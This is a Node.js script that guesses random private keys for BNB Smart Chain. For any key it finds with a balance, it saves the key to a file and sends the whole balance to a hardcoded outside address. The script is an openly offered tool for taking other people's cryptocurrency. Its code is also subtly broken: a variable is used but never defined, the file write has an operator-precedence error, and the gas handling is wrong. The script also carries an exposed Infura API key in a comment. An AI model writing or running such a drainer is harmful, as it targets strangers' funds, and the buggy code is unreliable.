const Web3 = require("web3");
const fs = require("fs");
const web3 = new Web3("https://bsc-dataseed.binance.org");
// const web3Ether = new Web3(
//   "https://mainnet.infura.io/v3/afa9553623db44b388348836b654f819"
// );

const genRanHex = (size) =>
  [...Array(size)]
    .map(() => Math.floor(Math.random() * 16).toString(16))
    .join("");
const sleep = (ms) =>
  new Promise((resolve) => {
    setTimeout(resolve, ms);
  });

const main = async () => {
  try {
    while (true) {
      const privateKey = genRanHex(64);
      const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
      const balance = await web3.eth.getBalance(address);
      // const balanceEther = await web3Ether.eth.getBalance(address);
      // if (balance > 0 || balanceEther > 0) {
      if (balance > 0) {
        console.log(privateKey, balance, balanceEther);
        fs.appendFileSync(
          "privateKeys.txt",
          privateKey + balance > 0 ? " bnb" : " eth" + "\n"
        );
        web3.eth.accounts.wallet.add({
          privateKey,
          address,
        });
        await sendEther(address, balance);
      } else {
        console.log(address, "no balance");
      }
    }
  } catch (error) {
    console.error(error.message);
    await sleep(3000);
    await main();
  }
};

const sendEther = async (from, balance) => {
  const to = "0x52D53cF066da6738e8F7A6E201a597C3380C13B6";
  const gas = web3.utils.toWei("21000", "wei");
  const sendAmount = parseFloat(balance) - parseFloat(gas);

  console.log(sendAmount);
  const tx = await web3.eth.sendTransaction({
    from: from,
    to: to,
    gas: "21000",
    value: sendAmount,
  });
  web3.eth.getTransaction(tx);
};

main();
